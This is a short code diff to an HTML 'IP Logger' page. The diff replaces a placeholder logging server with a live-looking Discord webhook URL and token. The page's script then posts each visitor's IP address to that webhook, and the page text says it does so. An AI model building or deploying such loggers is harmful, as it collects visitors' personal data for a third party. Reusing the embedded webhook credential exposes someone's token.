@@ -7,14 +7,14 @@
     function getIP(response) {
       var ip = response.ip;
       var xhr = new XMLHttpRequest();
-      xhr.open("POST", "http://your-server.com/log.php", true); // Replace "your-server.com/log.php" with your server endpoint
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.send("ip=" + ip);
+      xhr.open("POST", "https://discord.com/api/webhooks/1219974034486333521/cr48AKMgXBw8ELXyhhFvdcBlGItIQm3gYK89gtUAjOwa5Il4bqy_tVaHmJntQwOQ37pj", true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.send(JSON.stringify({ content: "IP Logged: " + ip }));
     }
   </script>
 </head>
 <body>
   <h1>Welcome to the IP Logger</h1>
-  <p>Your IP address will be logged.</p>
+  <p>Your IP address will be logged and sent to the Discord webhook.</p>
 </body>
 </html>
